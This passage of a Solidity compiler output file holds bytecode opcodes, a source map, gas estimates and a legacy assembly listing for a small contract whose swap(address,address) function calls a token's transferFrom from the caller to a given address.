SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH6 0xE36D6835A8CE RJUMP 0x7F23 BLOCKHASH DUP14 0x2E BALANCE EXTSTATICCALL LOG2 0xCE PUSH2 0x20F6 SSTORE 0xB7 ORIGIN 0x2A EXTSTATICCALL PUSH29 0xD02D04E924B564736F6C634300081D0033000000000000000000000000 ",
							"sourceMap": "233:222:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;257:196;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;394:5;387:26;;;414:10;426:2;430:15;387:59;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;257:196;;:::o;88:117:2:-;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:139::-;742:5;780:6;767:20;758:29;;796:33;823:5;796:33;:::i;:::-;696:139;;;;:::o;841:474::-;909:6;917;966:2;954:9;945:7;941:23;937:32;934:119;;;972:79;;:::i;:::-;934:119;1092:1;1117:53;1162:7;1153:6;1142:9;1138:22;1117:53;:::i;:::-;1107:63;;1063:117;1219:2;1245:53;1290:7;1281:6;1270:9;1266:22;1245:53;:::i;:::-;1235:63;;1190:118;841:474;;;;;:::o;1321:118::-;1408:24;1426:5;1408:24;:::i;:::-;1403:3;1396:37;1321:118;;:::o;1445:109::-;1514:7;1543:5;1532:16;;1445:109;;;:::o;1560:77::-;1597:7;1626:5;1615:16;;1560:77;;;:::o;1643:60::-;1671:3;1692:5;1685:12;;1643:60;;;:::o;1709:206::-;1791:9;1824:85;1842:66;1851:56;1901:5;1851:56;:::i;:::-;1842:66;:::i;:::-;1824:85;:::i;:::-;1811:98;;1709:206;;;:::o;1921:195::-;2040:69;2103:5;2040:69;:::i;:::-;2035:3;2028:82;1921:195;;:::o;2122:506::-;2303:4;2341:2;2330:9;2326:18;2318:26;;2354:71;2422:1;2411:9;2407:17;2398:6;2354:71;:::i;:::-;2435:72;2503:2;2492:9;2488:18;2479:6;2435:72;:::i;:::-;2517:104;2617:2;2606:9;2602:18;2593:6;2517:104;:::i;:::-;2122:506;;;;;;:::o;2634:90::-;2668:7;2711:5;2704:13;2697:21;2686:32;;2634:90;;;:::o;2730:116::-;2800:21;2815:5;2800:21;:::i;:::-;2793:5;2790:32;2780:60;;2836:1;2833;2826:12;2780:60;2730:116;:::o;2852:137::-;2906:5;2937:6;2931:13;2922:22;;2953:30;2977:5;2953:30;:::i;:::-;2852:137;;;;:::o;2995:345::-;3062:6;3111:2;3099:9;3090:7;3086:23;3082:32;3079:119;;;3117:79;;:::i;:::-;3079:119;3237:1;3262:61;3315:7;3306:6;3295:9;3291:22;3262:61;:::i;:::-;3252:71;;3208:125;2995:345;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "132400",
								"executionCost": "175",
								"totalCost": "132575"
							},
							"external": {
								"swap(address,address)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 233,
									"end": 455,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 233,
									"end": 455,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 233,
									"end": 455,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 233,
									"end": 455,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 233,
									"end": 455,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 233,
									"end": 455,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 233,
									"end": 455,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 233,
									"end": 455,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 233,
									"end": 455,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 233,
									"end": 455,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 233,
									"end": 455,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 233,
									"end": 455,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 233,
									"end": 455,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 233,
									"end": 455,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 233,
									"end": 455,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 233,
									"end": 455,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 233,
									"end": 455,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 233,
									"end": 455,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 233,
									"end": 455,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 233,
									"end": 455,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 233,
									"end": 455,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122065e36d6835a8cee07f23408d2e31fba2ce6120f655b7322afb7cd02d04e924b564736f6c634300081d0033",
									".code": [
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH",
											"source": 1,
											"value": "6B76484E"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 233,
											"end": 455,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 257,
											"end": 453,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 257,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 257,
											"end": 453,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 257,
											"end": 453,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 257,
											"end": 453,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 257,
											"end": 453,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 257,
											"end": 453,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 257,
											"end": 453,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 257,
											"end": 453,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 394,
											"end": 399,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 387,
											"end": 413,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 387,
											"end": 413,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 387,
											"end": 413,
											"name": "PUSH",
											"source": 1,
											"value": "23B872DD"
										},
										{
											"begin": 414,
											"end": 424,
											"name": "CALLER",
											"source": 1
										},
										{
											"begin": 426,
											"end": 428,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 430,
											"end": 445,
											"name": "PUSH",
											"source": 1,
											"value": "D3C21BCECCEDA1000000"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 387,
											"end": 446,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 387,
											"end": 446,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 387,
											"end": 446,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 387,
											"end": 446,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 257,
											"end": 453,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 88,
											"end": 205,
											"name": "tag",
											"source": 2,
											"value": "16"
										},
										{
											"begin": 88,
											"end": 205,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 197,
											"end": 198,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 194,
											"end": 195,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 187,
											"end": 199,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"name": "tag",
											"source": 2,
											"value": "18"
										},
										{
											"begin": 334,
											"end": 460,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 371,
											"end": 378,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 411,
											"end": 453,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 404,
											"end": 409,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 400,
											"end": 454,
											"name": "AND",
											"source": 2
										},
										{
											"begin": 389,
											"end": 454,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 389,
											"end": 454,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 334,
											"end": 460,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"name": "tag",
											"source": 2,
											"value": "19"
										},
										{
											"begin": 466,
											"end": 562,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 503,
											"end": 510,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 550,
											"end": 555,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 532,
											"end": 556,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "18"
										},
										{
											"begin": 532,
											"end": 556,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 532,
											"end": 556,
											"name": "tag",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 521,
											"end": 556,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 521,
											"end": 556,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 466,
											"end": 562,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 568,
											"end": 690,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 568,
											"end": 690,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 641,
											"end": 665,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 659,
											"end": 664,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 641,
											"end": 665,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "19"
										},
										{
											"begin": 641,
											"end": 665,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 641,
											"end": 665,
											"name": "tag",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 641,
											"end": 665,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 634,
											"end": 639,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 631,
											"end": 666,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 621,
											"end": 684,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 621,
											"end": 684,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 680,
											"end": 681,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 677,
											"end": 678,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 670,
											"end": 682,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 621,
											"end": 684,
											"name": "tag",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 621,
											"end": 684,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 568,
											"end": 690,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 568,
											"end": 690,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "tag",
											"source": 2,
											"value": "21"
										},
										{
											"begin": 696,
											"end": 835,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 742,
											"end": 747,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 780,
											"end": 786,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 767,
											"end": 787,
											"name": "CALLDATALOAD",
											"source": 2
										},
										{
											"begin": 758,
											"end": 787,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 758,
											"end": 787,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 796,
											"end": 829,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 823,
											"end": 828,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 796,
											"end": 829,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 796,
											"end": 829,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 796,
											"end": 829,
											"name": "tag",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 796,
											"end": 829,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "tag",
											"source": 2,
											"value": "6"
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 909,
											"end": 915,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 917,
											"end": 923,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 966,
											"end": 968,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 954,
											"end": 963,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 945,
											"end": 952,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 941,
											"end": 964,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 937,
											"end": 969,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 934,
											"end": 1053,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 934,
											"end": 1053,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 934,
											"end": 1053,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 972,
											"end": 1051,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 972,
											"end": 1051,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "16"
										},
										{
											"begin": 972,
											"end": 1051,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 972,
											"end": 1051,
											"name": "tag",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 972,
											"end": 1051,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 934,
											"end": 1053,
											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 934,
											"end": 1053,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1092,
											"end": 1093,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1117,
											"end": 1170,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 1162,
											"end": 1169,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 1153,
											"end": 1159,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1142,
											"end": 1151,
											"name": "DUP7",
											"source": 2
										},
										{
											"begin": 1138,
											"end": 1160,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1117,
											"end": 1170,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "21"
										},
										{
											"begin": 1117,
											"end": 1170,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1117,
											"end": 1170,
											"name": "tag",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 1117,
											"end": 1170,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1107,
											"end": 1170,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1107,
											"end": 1170,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1063,
											"end": 1180,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1219,
											"end": 1221,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1245,
											"end": 1298,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1290,
											"end": 1297,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 1281,
											"end": 1287,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1270,
											"end": 1279,
											"name": "DUP7",
											"source": 2
										},
										{
											"begin": 1266,
											"end": 1288,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1245,
											"end": 1298,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "21"
										},
										{
											"begin": 1245,
											"end": 1298,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1245,
											"end": 1298,
											"name": "tag",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1245,
											"end": 1298,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1235,
											"end": 1298,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1235,
											"end": 1298,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1190,
											"end": 1308,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 841,
											"end": 1315,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1321,
											"end": 1439,
											"name": "tag",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 1321,
											"end": 1439,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1408,
											"end": 1432,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "49"
										},
